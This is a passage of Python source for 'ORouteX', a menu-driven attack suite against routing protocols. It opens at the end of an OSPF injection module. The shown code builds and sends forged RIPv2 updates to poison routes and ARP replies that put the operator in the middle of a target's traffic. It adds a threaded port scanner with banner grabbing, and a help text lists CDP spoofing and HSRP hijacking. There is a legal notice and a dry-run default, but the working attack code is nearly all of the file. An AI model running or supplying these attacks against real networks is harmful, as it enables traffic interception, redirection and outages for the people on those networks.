            time.sleep(interval)
    except KeyboardInterrupt:
        pass

    print()
    ok(f"OSPF injection complete.  {BD}{sent}{R} Hellos sent.")
    warn("Full LSA injection requires adjacency establishment first.")

    out_dir = ask_save_path("ospf_inject")
    if out_dir:
        fmts  = _ask_export_formats()
        paths = save_results({
            "module":    "OSPF Injection",
            "target":    area_id,
            "router_id": router_id,
            "packets_sent": sent,
            "results":   [{"router_id": router_id, "area": area_id,
                           "priority": priority, "hellos": sent,
                           "attacker": details["ip"]}],
        }, "ospf_inject", out_dir, fmts)
        for p in paths:
            ok(f"Saved → {BD}{p}{R}")

    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  MODULE 5 — RIP POISONING
# ═══════════════════════════════════════════════════════════════════════════════

def module_rip():
    banner()
    section("MODULE 5 — RIP ROUTE POISONING", CY)
    info("Sends forged RIPv2 Update packets to inject or poison routes")
    info("in networks still running RIPv2 (UDP/520).")
    blank()

    iface      = pick_interface()
    details    = get_iface_details(iface)
    target_net = prompt_ip("Network prefix to poison", "192.168.50.0")
    mask       = prompt("Subnet mask", "255.255.255.0")
    nexthop    = prompt_ip("Next-hop to advertise (0.0.0.0 = self)",
                           "0.0.0.0")
    metric     = prompt_int("Metric (16 = unreachable / poison)", 16, 1, 16)
    burst      = prompt_int("Packet count", 30, 1, 10000)

    blank(); section("RIP POISONING — RUNNING", GR)
    info(f"Interface  : {BD}{iface}{R}  ({details['ip']})")
    info(f"Network    : {target_net}/{mask}")
    info(f"Next-hop   : {nexthop}")
    info(f"Metric     : {metric}  {'(POISON / unreachable)' if metric >= 16 else ''}")
    info(f"Burst      : {burst}")
    warn("Press Ctrl-C to abort.")
    blank()

    # RIPv2 header: cmd=2 (response), version=2, mbz=0
    rip_hdr  = struct.pack("!BBH", 2, 2, 0)
    entry    = struct.pack("!HH4s4s4sI",
                           2, 0,
                           socket.inet_aton(target_net),
                           socket.inet_aton(mask),
                           socket.inet_aton(nexthop),
                           metric)
    payload  = rip_hdr + entry

    ip_pkt   = IP(src=details["ip"], dst="224.0.0.9")
    udp_pkt  = UDP(sport=520, dport=520)
    packet   = ip_pkt / udp_pkt / Raw(load=payload)

    sent = 0
    try:
        for i in range(burst):
            send(packet, iface=iface, verbose=False)
            sent += 1
            print(f"\r  {GR}[✔]{R} [{_ts_now()}]  "
                  f"RIPv2 Update: {BD}{sent}{R}/{burst}  "
                  f"→ {target_net}  metric={metric}   ",
                  end="", flush=True)
            time.sleep(0.3)
    except KeyboardInterrupt:
        pass

    print()
    ok(f"RIP poisoning complete.  {BD}{sent}{R} packets sent.")

    out_dir = ask_save_path("rip_poison")
    if out_dir:
        fmts  = _ask_export_formats()
        paths = save_results({
            "module":      "RIP Route Poisoning",
            "target":      target_net,
            "packets_sent": sent,
            "results":     [{"network": target_net, "mask": mask,
                             "nexthop": nexthop, "metric": metric,
                             "attacker": details["ip"], "sent": sent}],
        }, "rip_poison", out_dir, fmts)
        for p in paths:
            ok(f"Saved → {BD}{p}{R}")

    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  MODULE 6 — ARP SPOOF
# ═══════════════════════════════════════════════════════════════════════════════

def module_arp():
    banner()
    section("MODULE 6 — ARP SPOOF (MITM)", CY)
    info("Poisons ARP caches of target and gateway to perform MITM.")
    info("Enables traffic interception on switched networks.")
    blank()

    iface    = pick_interface()
    details  = get_iface_details(iface)
    target   = prompt_ip("Target host IP", "192.168.1.10")
    gateway  = prompt_ip("Gateway IP",     "192.168.1.1")
    interval = prompt_int("Re-poison interval (sec)", 2, 1, 60)
    limit    = prompt_int("Packet pair count (0=∞)", 0, 0, 100000)

    # Resolve MACs
    blank()
    info("Resolving MAC addresses via ARP…")

    def resolve_mac(ip: str) -> str:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=iface, timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None

    target_mac  = resolve_mac(target)
    gateway_mac = resolve_mac(gateway)

    if not target_mac:
        err(f"Cannot resolve MAC for {target}. Is it alive?")
        pause(); return
    if not gateway_mac:
        err(f"Cannot resolve MAC for {gateway}. Is it reachable?")
        pause(); return

    ok(f"Target  {target}  →  {target_mac}")
    ok(f"Gateway {gateway}  →  {gateway_mac}")

    blank(); section("ARP SPOOF — RUNNING", GR)
    info(f"Interface : {BD}{iface}{R}  ({details['ip']}  {details['mac']})")
    info(f"Target    : {target}  ({target_mac})")
    info(f"Gateway   : {gateway}  ({gateway_mac})")
    info(f"Interval  : {interval}s")
    warn("Enable IP forwarding first:  echo 1 > /proc/sys/net/ipv4/ip_forward")
    warn("Press Ctrl-C to stop and restore ARP tables.")
    blank()

    # Poison packets
    # Tell target: gateway is at OUR mac
    pkt_t = Ether(dst=target_mac) / ARP(
        op=2, pdst=target, hwdst=target_mac,
        psrc=gateway, hwsrc=details["mac"])
    # Tell gateway: target is at OUR mac
    pkt_g = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway, hwdst=gateway_mac,
        psrc=target, hwsrc=details["mac"])

    sent = 0
    try:
        while True:
            sendp(pkt_t, iface=iface, verbose=False)
            sendp(pkt_g, iface=iface, verbose=False)
            sent += 1
            print(f"\r  {GR}[✔]{R} [{_ts_now()}]  "
                  f"ARP pair: {BD}{sent}{R}  "
                  f"poisoning {target} ↔ {gateway}   ",
                  end="", flush=True)
            if limit and sent >= limit:
                break
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

    print()
    ok(f"ARP spoof stopped.  {BD}{sent}{R} poison pairs sent.")
    info("Restoring ARP tables…")

    # Restore — gratuitous ARPs with real MACs
    restore_t = Ether(dst=target_mac) / ARP(
        op=2, pdst=target, hwdst=target_mac,
        psrc=gateway, hwsrc=gateway_mac)
    restore_g = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway, hwdst=gateway_mac,
        psrc=target, hwsrc=target_mac)
    for _ in range(5):
        sendp(restore_t, iface=iface, verbose=False)
        sendp(restore_g, iface=iface, verbose=False)
        time.sleep(0.2)
    ok("ARP tables restored.")

    out_dir = ask_save_path("arp_spoof")
    if out_dir:
        fmts  = _ask_export_formats()
        paths = save_results({
            "module":      "ARP Spoof",
            "target":      target,
            "gateway":     gateway,
            "packets_sent": sent * 2,
            "results":     [{"target": target, "target_mac": target_mac,
                             "gateway": gateway, "gateway_mac": gateway_mac,
                             "attacker_ip": details["ip"],
                             "attacker_mac": details["mac"],
                             "pairs_sent": sent}],
        }, "arp_spoof", out_dir, fmts)
        for p in paths:
            ok(f"Saved → {BD}{p}{R}")

    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  MODULE 7 — NETMASS SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

_svc_cache: dict = {}

def _resolve_svc(port: int) -> str:
    if port in _svc_cache:
        return _svc_cache[port]
    try:
        svc = socket.getservbyport(port)
    except Exception:
        svc = "unknown"
    _svc_cache[port] = svc
    return svc


def _grab_banner(ip: str, port: int, timeout: float = 1.0) -> str:
    """Attempt to grab a service banner."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        try:
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = s.recv(256).decode(errors="replace").strip()
            banner = banner.split("\n")[0][:80]
        except Exception:
            banner = ""
        s.close()
        return banner
    except Exception:
        return ""


def _scan_host(ip: str, ports: list, live_hosts: list,
               grab_banners: bool = False,
               timeout: float = 0.8):
    """ICMP ping + TCP port scan for one host."""
    try:
        reply = sr1(IP(dst=ip) / ICMP(),
                    timeout=timeout, verbose=False)
        if reply is None:
            # Try TCP SYN to port 80 as fallback
            syn_reply = sr1(
                IP(dst=ip) / TCP(dport=80, flags="S"),
                timeout=timeout / 2, verbose=False)
            if syn_reply is None:
                return
        with _scan_lock:
            live_hosts.append(ip)
        print(f"\n  {GR}[+]{R} Host alive: {BD}{ip}{R}")

        open_ports = []
        for port in ports:
            try:
                s = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout / 2)
                if s.connect_ex((ip, port)) == 0:
                    svc    = _resolve_svc(port)
                    banner = _grab_banner(ip, port) if grab_banners else ""
                    banner_s = f"  {DM}{banner[:60]}{R}" if banner else ""
                    print(f"       {CY}+--{R} "
                          f"{port:<6} {YL}{svc:<14}{R}{banner_s}")
                    with _scan_lock:
                        _scan_results.append({
                            "ip":      ip,
                            "port":    port,
                            "service": svc,
                            "banner":  banner,
                        })
                    open_ports.append(port)
                s.close()
            except Exception:
                pass
        if not open_ports:
            print(f"       {DM}(no open ports in tested range){R}")
    except Exception:
        pass


def module_netmass():
    global _scan_results
    banner()
    section("MODULE 7 — NETMASS SCANNER", CY)
    info("ICMP + TCP-SYN host discovery followed by multi-threaded")
    info("TCP connect port scan with optional banner grabbing.")
    blank()

    network_s   = prompt("Network CIDR to scan", "192.168.1.0/24")
    ports_s     = prompt("Ports — comma-separated or ENTER for defaults", "")
    threads_s   = prompt("Max concurrent threads", "80")
    timeout_s   = prompt("Per-host timeout (sec)", "1.0")
    grab_s      = prompt("Grab service banners? [y/N]", "n").lower()
    grab_banners= grab_s in ("y", "yes")

    try:
        net        = ipaddress.ip_network(network_s, strict=False)
        thread_cap = int(threads_s)
        timeout    = float(timeout_s)
    except Exception as e:
        err(f"Invalid input: {e}"); pause(); return

    if ports_s:
        try:
            ports = [int(p.strip()) for p in ports_s.split(",")
                     if p.strip().isdigit()]
        except Exception:
            err("Invalid port list."); pause(); return
    else:
        ports = DEFAULT_PORTS

    _scan_results = []
    live_hosts: list = []
    hosts = list(net.hosts())

    blank(); section("NETMASS — SCANNING", GR)
    info(f"Network  : {BD}{network_s}{R}  ({len(hosts)} hosts)")
    info(f"Ports    : {len(ports)} ports  "
         f"({ports[0]}…{ports[-1]})")
    info(f"Threads  : {thread_cap}")
    info(f"Timeout  : {timeout}s per host")
    info(f"Banners  : {'Yes' if grab_banners else 'No'}")
    warn("Press Ctrl-C to abort scan at any time.")
    blank()

    t_start       = time.time()
    sem           = threading.Semaphore(thread_cap)
    all_threads   = []

    def _worker(ip):
        try:
            _scan_host(str(ip), ports, live_hosts,
                       grab_banners, timeout)
        finally:
            sem.release()

    try:
        for ip in hosts:
            sem.acquire()
            if threading.active_count() > 512:
                time.sleep(0.05)
            t = threading.Thread(target=_worker,
                                 args=(ip,), daemon=True)
            t.start()
            all_threads.append(t)

        for t in all_threads:
            t.join(timeout=5)
    except KeyboardInterrupt:
        warn("Scan interrupted.")

    elapsed = time.time() - t_start

    blank(); print(SEP)
    section("NETMASS — RESULTS SUMMARY", YL)
    ok(f"Live hosts    : {BD}{len(live_hosts)}{R}")
    ok(f"Open services : {BD}{len(_scan_results)}{R}")
    ok(f"Elapsed       : {elapsed:.1f}s")
    ok(f"Rate          : {len(hosts)/elapsed:.1f} hosts/s")

    if live_hosts:
        blank()
        sub_section("LIVE HOSTS")
        for h in sorted(live_hosts,
                         key=lambda x: [int(p) for p in x.split(".")]):
            ports_open = [r["port"] for r in _scan_results
                          if r["ip"] == h]
            print(f"  {GR}●{R}  {BD}{h:<16}{R}  "
                  f"ports: {CY}{', '.join(map(str,ports_open)) or '—'}{R}")

    # Port frequency summary
    if _scan_results:
        blank()
        sub_section("PORT FREQUENCY")
        freq = defaultdict(int)
        for r in _scan_results:
            freq[r["port"]] += 1
        for port, count in sorted(freq.items(),
                                   key=lambda x: -x[1])[:10]:
            svc = _resolve_svc(port)
            bar = "█" * min(count, 40)
            print(f"  {BL}{port:<6}{R}  {YL}{svc:<14}{R}  "
                  f"{GR}{bar}{R} {count}")

    out_dir = ask_save_path("netmass")
    if out_dir:
        fmts  = _ask_export_formats()
        paths = save_results({
            "module":       "Netmass Scanner",
            "target":       network_s,
            "live_hosts":   len(live_hosts),
            "open_services": len(_scan_results),
            "elapsed_s":    round(elapsed, 2),
            "results":      _scan_results,
        }, "netmass", out_dir, fmts)
        for p in paths:
            ok(f"Saved → {BD}{p}{R}")

    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  MODULE 8 — SESSION LOGGER
# ═══════════════════════════════════════════════════════════════════════════════

def module_session():
    banner()
    section("MODULE 8 — SESSION LOGGER", CY)
    info("View and export the current session event log.")
    blank()

    if not _session_log:
        warn("No session events recorded yet.")
        pause(); return

    sub_section(f"SESSION LOG  ({len(_session_log)} events)")
    blank()
    colour_map = {
        "OK":   GR, "ERR": RD, "WARN": OR,
        "INFO": CY, "SENT": MG,
    }
    for entry in _session_log:
        col = colour_map.get(entry["kind"], WH)
        print(f"  {DM}[{entry['ts']}]{R}  "
              f"{col}{entry['kind']:<5}{R}  {entry['msg']}")

    blank()
    print(SEP_DIM)
    info(f"Total events: {len(_session_log)}")

    out_dir = ask_save_path("session_log")
    if out_dir:
        fmts  = _ask_export_formats()
        paths = save_results({
            "module":  "Session Logger",
            "target":  "—",
            "session": {
                "start": _session_log[0]["ts"] if _session_log else "—",
                "end":   _session_log[-1]["ts"] if _session_log else "—",
                "events": len(_session_log),
            },
            "results": _session_log,
        }, "session_log", out_dir, fmts)
        for p in paths:
            ok(f"Saved → {BD}{p}{R}")

    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  HELP  (F1 / [H])
# ═══════════════════════════════════════════════════════════════════════════════

HELP_CONTENT = f"""
  {CY}{BD}╔══════════════════════════════════════════════════════════════════╗{R}
  {CY}{BD}║   ORouteX {VERSION}  ·  Routing Protocol Attack Suite              ║{R}
  {CY}{BD}║   {DEV}  ·  {SITE}  ·  {YEAR}                    ║{R}
  {CY}{BD}╚══════════════════════════════════════════════════════════════════╝{R}

  {YL}{BD}OVERVIEW{R}
  {DM}────────{R}
    ORouteX is a professional routing protocol attack framework designed
    for authorised penetration testing of network infrastructure.  It runs
    on Debian Linux (and derivatives) and requires root privileges.

  {YL}{BD}MODULE DETAILS{R}
  {DM}──────────────{R}

  {BL}[1]{R}  {BD}CDP Spoof{R}
       Sends forged Cisco Discovery Protocol (CDP) frames using the
       01:00:0c:cc:cc:cc multicast MAC.  Allows impersonation of Cisco
       routers and switches on the LAN segment.  Configurable device name,
       platform, IOS version, and port ID.
       Requires: scapy CDP contrib  (scapy.contrib.cdp)

  {BL}[2]{R}  {BD}HSRP Hijack{R}
       Floods 224.0.0.2 UDP/1985 with maximum-priority HSRP Hello and Coup
       packets to seize the Active Router role.  Redirects all default-
       gateway traffic through this machine.  Supports configurable group,
       priority, and HSRP authentication password.

  {BL}[3]{R}  {BD}IGRP Route Injection{R}
       Crafts raw IGRP Update packets (IP protocol 9) carrying forged route
       entries.  Targets legacy Cisco environments still running the obsolete
       IGRP protocol.  Configurable AS number, metric, and network prefix.

  {BL}[4]{R}  {BD}OSPF Injection{R}
       Sends forged OSPF Hello packets to trigger neighbour adjacency
       formation in OSPF domains.  Advertises an attacker-controlled
       Router-ID and DR priority to influence topology.
       Full LSA injection requires established adjacency.

  {BL}[5]{R}  {BD}RIP Route Poisoning{R}
       Sends crafted RIPv2 Update packets (UDP/520) carrying poison routes
       (metric=16 = unreachable) or arbitrary next-hops to redirect traffic
       in environments running RIPv2.

  {BL}[6]{R}  {BD}ARP Spoof (MITM){R}
       Classic ARP cache poisoning.  Poisons both target and gateway ARP
       tables to become man-in-the-middle.  Automatically restores ARP
       tables when stopped.  Requires IP forwarding enabled.
       Enable:  echo 1 > /proc/sys/net/ipv4/ip_forward

  {BL}[7]{R}  {BD}Netmass Scanner{R}
       ICMP + TCP-SYN host discovery followed by multi-threaded TCP connect
       port scan across a CIDR range.  Optional service banner grabbing.
       Port frequency statistics.  Results exported in JSON/CSV/HTML/MD/TXT.

  {BL}[8]{R}  {BD}Session Logger{R}
       Displays and exports the full event log for the current session.
       All module activity (packets sent, errors, results) is logged here.

  {YL}{BD}SAVE RESULTS{R}
  {DM}────────────{R}
    Every module offers a Save Results prompt after execution:
      {BL}[1]{R}  Current Directory  — saves next to ORouteX
      {BL}[2]{R}  Home Folder (~)    — saves to ~/ORouteX_results/
      {BL}[3]{R}  Custom Path…       — prompts for a full directory path
      {BL}[4]{R}  Skip               — no files saved

    Supported export formats: JSON · CSV · TXT · HTML · Markdown

  {YL}{BD}REQUIREMENTS{R}
  {DM}────────────{R}
    pip install scapy netifaces
    sudo ORouteX
    OS: Debian Linux / Ubuntu / Kali (or any root-capable Linux)

  {OR}{BD}⚠  LEGAL & ETHICAL NOTICE{R}
  {DM}─────────────────────────{R}
    {OR}This tool MUST only be used on systems and networks you own or have
    explicit written authorisation to test.  Unauthorised use is illegal
    and may result in civil and criminal prosecution.  The developer and
    owlsec.org assume NO liability for misuse.{R}
"""


def show_help():
    banner()
    section("HELP — MODULE OVERVIEW & USAGE", MG)
    print(HELP_CONTENT)
    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ═══════════════════════════════════════════════════════════════════════════════

MENU_ITEMS = [
    ("1", "CDP Spoof",            "Fake Cisco Discovery Protocol frames",    module_cdp),
    ("2", "HSRP Hijack",          "Seize Active Router via priority storm",   module_hsrp),
    ("3", "IGRP Injection",       "Poison legacy IGRP routing tables",        module_igrp),
    ("4", "OSPF Injection",       "Inject fake LSAs into OSPF domain",        module_ospf),
    ("5", "RIP Poisoning",        "Inject poison routes via RIPv2",           module_rip),
    ("6", "ARP Spoof",            "Classic ARP cache poisoning / MITM",       module_arp),
    ("7", "Netmass Scanner",      "ICMP discovery + TCP port scan",           module_netmass),
    ("8", "Session Logger",       "View & export current session log",        module_session),
]


def main_menu():
    while True:
        banner()

        print(f"\n  {YL}{BD}╔══  MODULES{R}")
        print(f"  {YL}{'─' * (W - 2)}{R}\n")

        for key, name, desc, _ in MENU_ITEMS:
            print(f"    {BL}[{key}]{R}  {BD}{name:<22}{R}  {DM}{desc}{R}")

        print()
        print(f"    {MG}[H]{R}  {BD}{'Help':<22}{R}  {DM}Module documentation & usage{R}")
        print(f"    {RD}[0]{R}  {BD}{'Exit':<22}{R}")
        print()
        print(SEP)

        if _scan_results or _session_log:
            print(f"  {DM}Session: {len(_session_log)} events  ·  "
                  f"{len(_scan_results)} scan results  ·  "
                  f"{len([r for r in _session_log if r['kind']=='SENT'])} packets sent{R}")
            print()

        choice = prompt("Select module").upper()

        # Dispatch
        dispatched = False
        for key, _, _, func in MENU_ITEMS:
            if choice == key:
                func()
                dispatched = True
                break

        if not dispatched:
            if choice in ("H", "HELP", "?"):
                show_help()
            elif choice == "0":
                banner()
                ok(f"ORouteX terminated. Stay authorized — {SITE}")
                blank()
                sys.exit(0)
            else:
                warn(f"Unknown option '{choice}'.  Enter 1–8, H, or 0.")
                time.sleep(0.8)


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def _sigint_handler(sig, frame):
    print(f"\n\n  {OR}[!]{R}  Interrupted — cleaning up and exiting ORouteX.\n")
    sys.exit(0)


def _parse_args():
    ap = argparse.ArgumentParser(
        prog="ORouteX",
        description=f"{APP} {VERSION} — {FULL}  ({SITE})",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="  ⚠  Authorised security testing use only.\n"
               f"  Run as root:  sudo ORouteX")
    ap.add_argument("--version", action="version",
                    version=f"{APP} {VERSION}")
    ap.add_argument("--module", metavar="N",
                    help="Launch module directly (1-8)")
    ap.add_argument("--i-am-authorized", dest="authorized",
                    action="store_true",
                    help="Request live packet transmission (requires typed "
                         "confirmation). Omit to stay in SAFE dry-run mode.")
    return ap.parse_args()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _sigint_handler)

    args = _parse_args()

    # Defensive default: stay in SAFE (dry-run) mode unless explicitly unlocked.
    unlock_live_transmission(getattr(args, "authorized", False))
    if SAFE_MODE:
        print(f"  {GR}[SAFE-MODE]{R} Dry-run active — offensive packets are "
              f"summarised, not transmitted.\n")

    if args.module:
        # Direct module launch
        m_map = {str(i+1): func for i, (_, _, _, func) in
                 enumerate(MENU_ITEMS)}
        func = m_map.get(args.module)
        if func:
            banner()
            func()
        else:
            print(f"[!] Invalid module number: {args.module}")
            sys.exit(1)
    else:
        main_menu()
